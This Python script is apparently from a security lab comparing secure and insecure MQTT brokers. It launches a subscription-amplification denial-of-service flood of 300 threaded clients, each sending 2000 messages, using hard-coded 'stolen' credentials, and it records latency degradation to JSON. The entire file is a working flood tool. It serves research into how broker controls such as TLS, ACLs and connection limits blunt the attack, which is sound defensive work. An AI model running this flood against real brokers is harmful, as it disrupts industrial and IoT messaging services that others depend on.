#!/usr/bin/env python3
"""
03_dos.py - DoS Attack (SECURE environment)

Subscription amplification attack — same technique as insecure.
The attacker uses stolen metrics_collector credentials (obtained via
lateral movement in S5) and attempts the same N-fold fanout flood.

Broker security controls reduce the impact measurably:
  - TLS required        : each connection costs crypto handshake overhead
  - Authentication      : attacker must use stolen credentials
  - max_connections 20  : only ~15 flood workers connect; rest are refused
  - ACL enforcement     : can only access sensors/# and metrics/dos/latency
  - max_queued_messages : throttles message delivery per subscription queue

Compare with insecure: same parameters, visibly different outcome.
MITRE ATT&CK ICS: T0814 Denial of Service
"""

import paho.mqtt.client as mqtt
import ssl
import threading
import time
import json
import os
from datetime import datetime, timezone

BROKER_HOST       = os.getenv("BROKER_HOST", "172.21.0.20")
BROKER_PORT       = int(os.getenv("BROKER_PORT", 8883))
FLOOD_CONNECTIONS = 300
MSGS_PER_CLIENT   = 2000
FLOOD_TOPIC       = "metrics/dos/latency"
LATENCY_TOPIC     = "metrics/dos/probe"     # dedicated probe topic — no flood traffic here
OUTPUT_DIR        = "/attacker/results"
CA_CERT           = "/attacker/ca.crt"
FLOOD_PAYLOAD     = "X" * 256

# Credentials stolen via lateral movement (S5)
STOLEN_USER = "metrics_collector"
STOLEN_PASS = "Metrics2026"

latency_samples  = []
messages_sent    = [0]
connected_count  = [0]
rejected_count   = [0]
subscribed_count = [0]
all_subscribed   = threading.Event()
lock             = threading.Lock()
monitor_running  = threading.Event()
monitor_running.set()
current_phase    = ["baseline"]


def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def latency_monitor():
    received  = threading.Event()
    send_time = [0.0]

    def on_connect(c, u, f, rc, p):
        if rc == 0:
            c.subscribe(LATENCY_TOPIC, qos=0)

    def on_message(c, u, msg):
        lat = round((time.time() - send_time[0]) * 1000, 2)
        latency_samples.append({"ts": datetime.now().isoformat(),
                                 "ms": lat, "phase": current_phase[0]})
        received.set()

    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="dos_monitor")
    client.tls_set(ca_certs=CA_CERT, tls_version=ssl.PROTOCOL_TLS_CLIENT)
    client.tls_insecure_set(False)
    client.username_pw_set(STOLEN_USER, STOLEN_PASS)
    client.on_connect = on_connect
    client.on_message = on_message
    try:
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
        client.loop_start()
        time.sleep(0.5)
        while monitor_running.is_set():
            received.clear()
            send_time[0] = time.time()
            client.publish(LATENCY_TOPIC, "probe", qos=0)
            if not received.wait(timeout=3.0):
                latency_samples.append({"ts": datetime.now().isoformat(),
                                         "ms": 3000, "phase": current_phase[0]})
            time.sleep(0.5)
        client.loop_stop()
        client.disconnect()
    except Exception as e:
        log(f"[!] Monitor error: {e}")


def flood_worker(worker_id):
    """
    Attempt subscription amplification with stolen credentials.

    max_connections 20 means most workers are refused at connect time.
    Those that do connect subscribe to all ACL-accessible topics, then
    flood — the broker routes each message to all active subscribers,
    but the limited worker count and topic scope keep the fanout low.
    """
    this_connected = [False]

    def on_connect(c, u, f, rc, p):
        if rc == 0:
            this_connected[0] = True
            # Subscribe to every readable topic within ACL scope — maximise fanout
            c.subscribe([("sensors/#", 0),
                          ("metrics/dos/latency", 0)])
            with lock:
                connected_count[0] += 1
        else:
            with lock:
                rejected_count[0] += 1

    def on_subscribe(c, u, mid, granted_qos, p):
        with lock:
            subscribed_count[0] += 1

    try:
        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
                             client_id=f"flood_{worker_id}")
        client.tls_set(ca_certs=CA_CERT, tls_version=ssl.PROTOCOL_TLS_CLIENT)
        client.tls_insecure_set(False)
        client.username_pw_set(STOLEN_USER, STOLEN_PASS)
        client.on_connect = on_connect
        client.on_subscribe = on_subscribe
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
        client.loop_start()

        # Wait for the main thread to signal that the connection phase is over
        all_subscribed.wait(timeout=30)

        if this_connected[0]:
            payload = json.dumps({"w": worker_id, "data": FLOOD_PAYLOAD})
            for i in range(MSGS_PER_CLIENT):
                client.publish(FLOOD_TOPIC, payload, qos=0)
                time.sleep(0.005)   # 5 ms between publishes → flood lasts ~10s per worker,
                if i % 100 == 0:    # ensuring overlap with the campaign measurement window
                    with lock:
                        messages_sent[0] += 100

        client.loop_stop()
        client.disconnect()
    except Exception:
        with lock:
            rejected_count[0] += 1


def stats(phase):
    s = [x["ms"] for x in latency_samples if x["phase"] == phase]
    if not s:
        return {"count": 0, "avg": "N/A", "min": "N/A", "max": "N/A"}
    return {"count": len(s), "avg": round(sum(s)/len(s), 2),
            "min": round(min(s), 2), "max": round(max(s), 2)}


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    output_file = f"{OUTPUT_DIR}/03_dos_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

    print("==============================================")
    print(" SCENARIO 3 - DoS Attack (SECURE)")
    print("==============================================")
    print(f" Broker         : {BROKER_HOST}:{BROKER_PORT}")
    print(f" Flood clients  : {FLOOD_CONNECTIONS}")
    print(f" Msgs/client    : {MSGS_PER_CLIENT}")
    print(f" Total attempts : {FLOOD_CONNECTIONS * MSGS_PER_CLIENT}")
    print(f" Technique      : Subscription amplification — same as insecure")
    print(f" Credentials    : {STOLEN_USER} (stolen via lateral movement)")
    print(f" Auth required  : YES — TLS + password")
    print(f" Mitigations    : max_connections=20, ACL, rate limiting")
    print("==============================================\n")

    t_mon = threading.Thread(target=latency_monitor, daemon=True)
    t_mon.start()

    # Baseline
    log("[*] Collecting baseline latency (10s)...")
    time.sleep(10)
    bs = stats("baseline")
    log(f"[+] Baseline: avg={bs['avg']}ms  max={bs['max']}ms  samples={bs['count']}\n")

    # Launch all workers — max_connections will reject most of them
    log(f"[*] Launching {FLOOD_CONNECTIONS} flood workers (broker max_connections=20)...")
    current_phase[0] = "flood"
    threads = [threading.Thread(target=flood_worker, args=(i,))
               for i in range(FLOOD_CONNECTIONS)]
    for t in threads:
        t.start()

    # Give workers 5s to connect and subscribe, then release the flood
    time.sleep(5)
    log(f"[*] Connection phase complete: {connected_count[0]} connected, "
        f"{rejected_count[0]} rejected — releasing flood...")
    all_subscribed.set()

    while any(t.is_alive() for t in threads):
        alive = sum(1 for t in threads if t.is_alive())
        s = stats("flood")
        log(f"[~] Active: {alive}/{FLOOD_CONNECTIONS} | "
            f"Connected: {connected_count[0]} Rejected: {rejected_count[0]} | "
            f"Msgs sent: {messages_sent[0]} | "
            f"Latency avg={s.get('avg','N/A')}ms max={s.get('max','N/A')}ms")
        time.sleep(2)

    for t in threads:
        t.join()

    fs = stats("flood")
    log(f"[+] Flood complete: avg={fs['avg']}ms  max={fs['max']}ms  samples={fs['count']}\n")

    # Recovery
    current_phase[0] = "recovery"
    time.sleep(5)
    monitor_running.clear()
    time.sleep(1)
    rs = stats("recovery")
    log(f"[+] Recovery: avg={rs['avg']}ms  max={rs['max']}ms\n")

    d = (round((fs["avg"] - bs["avg"]) / bs["avg"] * 100, 1)
         if isinstance(fs["avg"], float) and isinstance(bs["avg"], float) and bs["avg"] > 0
         else "N/A")

    results = {
        "environment":        "secure",
        "broker":             f"{BROKER_HOST}:{BROKER_PORT}",
        "flood_clients":      FLOOD_CONNECTIONS,
        "msgs_per_client":    MSGS_PER_CLIENT,
        "total_attempts":     FLOOD_CONNECTIONS * MSGS_PER_CLIENT,
        "workers_connected":  connected_count[0],
        "workers_rejected":   rejected_count[0],
        "latency_baseline":   bs,
        "latency_flood":      fs,
        "latency_recovery":   rs,
        "degradation_pct":    d,
        "messages_sent":      messages_sent[0],
        "auth_required":      True,
        "tls":                True,
        "stolen_credentials": STOLEN_USER,
        "all_samples":        latency_samples,
    }
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)

    print("==============================================")
    print(" ATTACK SUMMARY - Scenario 3 (SECURE)")
    print("==============================================")
    print(f" Technique         : Subscription amplification")
    print(f" Workers connected : {connected_count[0]}/{FLOOD_CONNECTIONS} "
          f"({rejected_count[0]} refused by max_connections=20)")
    print(f" Baseline latency  : avg={bs['avg']}ms  max={bs['max']}ms")
    print(f" Flood latency     : avg={fs['avg']}ms  max={fs['max']}ms")
    print(f" Recovery latency  : avg={rs['avg']}ms")
    print(f" Degradation       : {'+' if isinstance(d, float) and d > 0 else ''}{d}%")
    print(f" Messages sent     : {messages_sent[0]}")
    print(f" Result            : PARTIALLY MITIGATED")
    print(f" Output            : {output_file}")
    print("==============================================")


if __name__ == "__main__":
    main()
